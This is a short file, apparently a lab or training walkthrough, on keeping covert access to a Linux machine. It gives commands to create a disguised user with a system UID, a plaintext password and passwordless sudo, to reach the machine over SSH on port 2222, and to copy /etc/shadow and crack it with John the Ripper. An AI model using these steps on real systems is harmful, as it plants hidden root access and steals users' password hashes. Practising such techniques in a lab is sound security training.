@@ -1,0 +1,93 @@
+Step 1: Shadow People
+
+Create a secret user named sysd. Make sure this user doesn't have a home folder created:
+
+sudo adduser sysd
+
+
+Give your secret user a password:
+
+sudo passwd sysd
+Enter new UNIX password: keytoall
+Retype new UNIX password: keytoall
+
+
+
+Give your secret user a system UID < 1000:
+
+sudo usermod -u 600 sysd
+
+
+
+Give your secret user the same GID:
+
+sudo groupmod -g 600 sysd
+
+
+
+Give your secret user full sudo access without the need for a password:
+
+sudo visudo
+
+
+
+
+Test that sudo access works without your password:
+
+sudo -l
+
+
+
+Step 2: Smooth Sailing
+
+Edit the sshd_config file:
+
+nano /etc/ssh/sshd_config
+
+
+
+Step 3: Testing Your Configuration Update
+
+Restart the SSH service:
+
+service ssh restart
+
+
+
+Exit the root account:
+
+Exit
+
+
+
+
+
+SSH to the target machine using your sysd account and port 2222:
+
+ssh sysd@192.168.6.105 -p 2222
+
+
+
+
+Use sudo to switch to the root user:
+
+sudo su
+
+
+
+Step 4: Crack All the Passwords
+
+SSH back to the system using your sysd account and port 2222:
+
+ssh sysd@192.168.6.105 -p 2222
+
+Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
+
+(Reference: https://www.youtube.com/watch?v=X1Yl_StL1ac)
+
+Sudo -s
+cp /etc/passwd password1.txt
+cp /etc/shadow unshadow1.txt
+unshadow password1.txt unshadow1.txt > john-input
+john john-input
+
